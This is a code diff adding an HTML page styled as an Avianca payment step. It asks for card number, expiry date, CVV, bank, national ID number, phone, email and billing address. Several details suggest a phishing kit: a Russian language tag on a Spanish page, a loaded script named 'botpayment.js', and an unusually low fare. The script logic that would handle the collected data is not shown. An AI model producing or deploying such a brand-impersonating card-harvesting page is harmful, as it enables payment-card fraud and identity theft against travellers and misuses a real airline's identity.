@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avianca - Payment</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="shortcut icon" href="./assets/a.png" t ype="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="./css/flight.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+
+    <!-- START -->
+    <script src="./js/functions.js"></script>
+</head>
+
+<body class="mvh-100 bg-gray">
+
+    <!-- ON LOADER -->
+    <div class="loader show">
+        <img class="" src="./assets/svg/plane-loader.gif">
+    </div>
+
+
+
+    <header>
+        <div class="next-step">
+            <img class="ns-logo" src="./assets/logos/avianca_red (2).svg">
+            <div class="ns-step">
+                <img src="./galeria/step_3_header.png">
+            </div>
+        </div>
+    </header>
+    <br>
+    <div>
+
+
+        <main>
+            <div class="main-form">
+                <form id="next-step" class="form-control">
+                    <div class="form-header">
+                        <label class="radio-wrapper" for="ida_vuelta">
+                            <input type="radio" checked id="ida_vuelta" name="opcion_viaje"
+                                onclick="info.flightInfo.type = 1; updateLS(); updateDOM()">
+                            <div class="radio-circle">
+                                <div class="radio-dot"></div>
+                            </div>
+                            <h3 class="radio-label">Tarjeta de crédito y débito</h3>
+                        </label>
+                    </div>
+                    <hr>
+                    <!-- CARD SECTION -->
+                    <div class="form-section">
+                        <div class="companies-container">
+                            <img src="./galeria/visa.svg"class="card-img">
+                            <img src="./galeria/mc.svg"class="card-img">
+                            <img src="./galeria/diners.svg"class="card-img">
+                            <img src="./galeria/amex.svg"class="card-img">
+                            <img src="./galeria/uatp.png" width="50px"class="card-img">
+                        </div>
+
+
+                        <h4>Información de la tarjeta</h4>
+                        <div class="checkbox-group mt-2">
+                            <input class="check fs-2" type="checkbox" id="">
+                            <label for="">Mi tarjeta de crédito no es de Colombia</label>
+                        </div>
+
+
+                        <input id="p" class="input-cc bg-std mt-2" placeholder="Número de Tarjeta" type="text"
+                            oninput="formatCNumber(this)">
+                        <label class="fs-5">Ingresa tu tarjeta crédito, débito o Avianca UATP</label>
+
+
+                        <div class="input-group mt-2">
+                            <div class="me-2">
+                                <input id="pdate" type="text" placeholder="MM/AA" oninput="formatDate(this)">
+                                <label class="fs-5">Fecha de Expiración</label>
+                            </div>
+
+                            <div>
+                                <input class="" type="text" id="c" maxlength="3" placeholder="CVV">
+                                <label class="fs-5">Código de seguridad</label>
+                            </div>
+                        </div>
+
+                        <!-- BANCO -->
+                        <select id="ban" required name="txt-entidad" class="mt-4">
+                            <option label="Seleccione su banco" value="">Seleccione su banco</option>
+                            <option label="BANCAMIA S.A." value="BANCAMIA S.A.">BANCAMIA S.A.</option>
+                            <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
+                            <option label="BANCO AV VILLAS" value="avvillas">BANCO AV VILLAS</option>
+                            <option label="BANCO BBVA COLOMBIA S.A." value="bbva">BANCO BBVA COLOMBIA S.A.</option>
+                            <option label="BANCO CAJA SOCIAL" value="caja-social">BANCO CAJA SOCIAL</option>
+                            <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">BANCO
+                                COOPERATIVO COOPCENTRAL</option>
+                            <option label="BANCO CREDIFINANCIERA" value="credifinanciera">BANCO CREDIFINANCIERA</option>
+                            <option label="BANCO DAVIVIENDA" value="davivienda">BANCO DAVIVIENDA</option>
+                            <option label="BANCO DE BOGOTA" value="bogota">BANCO DE BOGOTA</option>
+                            <option label="BANCO DE OCCIDENTE" value="occidente">BANCO DE OCCIDENTE</option>
+                            <option label="BANCO FALABELLA " value="falabella">BANCO FALABELLA </option>
+                            <option label="BANCO FINANDINA S.A. BIC" value="finandina">BANCO FINANDINA S.A. BIC</option>
+                            <option label="BANCO GNB SUDAMERIS" value="sudameris">BANCO GNB SUDAMERIS</option>
+                            <option label="BANCO ITAU" value="iItau">BANCO ITAU</option>
+                            <option label="BANCO PICHINCHA S.A." value="pichincha">BANCO PICHINCHA S.A.</option>
+                            <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
+                            <option label="BANCO SANTANDER COLOMBIA" value="santander">BANCO SANTANDER COLOMBIA</option>
+                            <option label="BANCO SERFINANZA" value="serfinanza">BANCO SERFINANZA</option>
+                            <option label="BANCO UNION antes GIROS" value="union">BANCO UNION antes GIROS</option>
+                            <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
+                            <option label="BANCOOMEVA S.A." value="bancomeva">BANCOOMEVA S.A.</option>
+                            <option label="CFA COOPERATIVA FINANCIERA" value="coltefinanciera">CFA COOPERATIVA FINANCIERA</option>
+                            <option label="CITIBANK " value="Citibank">CITIBANK</option>
+                            <option label="COLTEFINANCIERA" value="coltefinanciera">COLTEFINANCIERA</option>
+                            <option label="CONFIAR COOPERATIVA FINANCIERA" value="confiar">CONFIAR COOPERATIVA
+                                FINANCIERA</option>
+                            <option label="COOFINEP COOPERATIVA FINANCIERA" value="coofinep">COOFINEP COOPERATIVA
+                                FINANCIERA</option>
+                            <option label="COTRAFA" value="cotrafa">COTRAFA</option>
+                            <option label="DALE" value="dale">DALE</option>
+                            <option label="DAVIPLATA" value="daviplata">DAVIPLATA</option>
+                            <option label="IRIS" value="iris">IRIS</option>
+                            <option label="LULO BANK" value="Lulo">LULO BANK</option>
+                            <option label="MOVII S.A." value="movii">MOVII S.A.</option>
+                            <option label="NEQUI" value="nequi">NEQUI</option>
+                            <option label="RAPPIPAY" value="rappipay">RAPPIPAY</option>
+                            <option label="RAPPIPAY DAVIPLATA" value="movii">RAPPIPAY DAVIPLATA</option>
+                            <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria">SCOTIABANK COLPATRIA
+                            </option>
+                        </select>
+
+                        <select id="dues" required class="mt-4 mb-5">
+                            <option value="" disabled selected>Seleccione el Número de cuotas</option>
+                            <option value="1">Pagar Monto total</option>
+                            <option value="2">2</option>
+                            <option value="3">3</option>
+                            <option value="4">4</option>
+                            <option value="5">5</option>
+                            <option value="6">6</option>
+                            <option value="7">7</option>
+                            <option value="8">8</option>
+                            <option value="9">9</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+                            <option value="13">13</option>
+                            <option value="14">14</option>
+                            <option value="15">15</option>
+                            <option value="16">16</option>
+                            <option value="17">17</option>
+                            <option value="18">18</option>
+                            <option value="19">19</option>
+                            <option value="20">20</option>
+                            <option value="21">21</option>
+                            <option value="22">22</option>
+                            <option value="23">23</option>
+                            <option value="24">24</option>
+                            <option value="25">25</option>
+                            <option value="26">26</option>
+                            <option value="27">27</option>
+                            <option value="28">28</option>
+                            <option value="29">29</option>
+                            <option value="30">30</option>
+                            <option value="31">31</option>
+                            <option value="32">32</option>
+                            <option value="33">33</option>
+                            <option value="34">34</option>
+                            <option value="35">35</option>
+                            <option value="36">36</option>
+                        </select>
+
+                        <h4 class="mt-5">Información del titular</h4>
+                        <input id="name" class="mt-4" type="text" placeholder="Nombre del titular de la tarjeta" id="">
+                        <input id="surname" class="mt-4" type="text" placeholder="Apellido del titular de la tarjeta"
+                            id="">
+                        <input id="cc" class="mt-4" type="text" placeholder="Número de identificación"
+                            oninput="limitDigits(this, 10)">
+                        <input id="email" class="mt-4" type="text" placeholder="Correo" id="">
+                        <input id="telnum" class="mt-4 mb-5" type="text" id="" maxlength="9999999999"
+                            placeholder="Celular" oninput="limitDigits(this, 10)">
+                        <label>
+                            <div>
+
+                                <center>
+                                    <h4 class="mt-4">Datos de facturación</h4>
+                                </center>
+                                <input id="city" class="mt-4" type="text" placeholder="Ciudad" id="">
+                                <input id="state" class="mt-4" type="text" placeholder="Estado/Provincia" id="">
+                                <input id="address" class="mt-4" type="text" placeholder="Dirección" id="">
+
+
+                                <div class="checkbox-group mt-4">
+                                    <div>
+                                        <input class="check" type="checkbox" name="" id="">
+                                    </div>
+                                    <label>Por la presente declaro que soy mayor de edad, he leído y acepto el <a
+                                            href="">contrato de transporte</a>, y la <a href="">política general de
+                                            privacidad de clientes, viajeros y usuarios</a> y las condiciones de <a
+                                            href="">manejo de mercancías peligrosas</a>, la política de cancelación y
+                                        penalidades por cambio, el cobro de impuestos y cargos gubernamentales no
+                                        incluidos en el valor del servicio, así como aquellos incluidos y las <a
+                                            href="">condiciones de acceso de uso de este sitio web.</a></label>
+                                </div>
+                                <div class="mt-4 show justify-content-center">
+                                    <button type="submit" class="btn btn-gray">
+                                        Pago seguro
+                                    </button>
+                                </div>
+                            </div>
+
+                </form>
+
+                <form class="form-control mt-5 mb-10">
+                    <div class="form-header">
+                        <label class="radio-wrapper" for="ida_vuelta">
+                            <input type="radio" disabled id="ida_vuelta">
+                            <div class="radio-circle">
+                                <div class="radio-dot"></div>
+                            </div>
+                            <h3 class="radio-label disabled">PSE (Deshabilitado)</h3>
+                        </label>
+                    </div>
+                </form>
+            </div>
+        </main>
+
+        <footer class="footer-fixed-2">
+            <div class="footer-flight-resume">
+                <div>
+                    <p class="mb-1">Resumen del viaje:</p>
+                    <div class="show align-items-center">
+                        <h4 id="origin-code">BOG</h4>
+                        <img src="./galeria/arrow.png" width="14px">
+                        <h4 id="destination-code">CLI</h4>
+                    </div>
+                </div>
+                <div>
+                    <h4 class="text-end mt-1">$<span id="flight-cost">65.600</span> COP</h4>
+                    <p class="fs-5">Total de tu reserva:</p>
+                    <img src="./galeria/info_icon.png" width="15px">
+                </div>
+            </div>
+
+            <p class="mt-2 mb-2">© Avianca S.A 2024</p>
+        </footer>
+
+        <!-- SCRIPTS -->
+        <script src="./js/payment.js"></script>
+        <script src="./js/botpayment.js"></script>
+</body>
+
+</html>
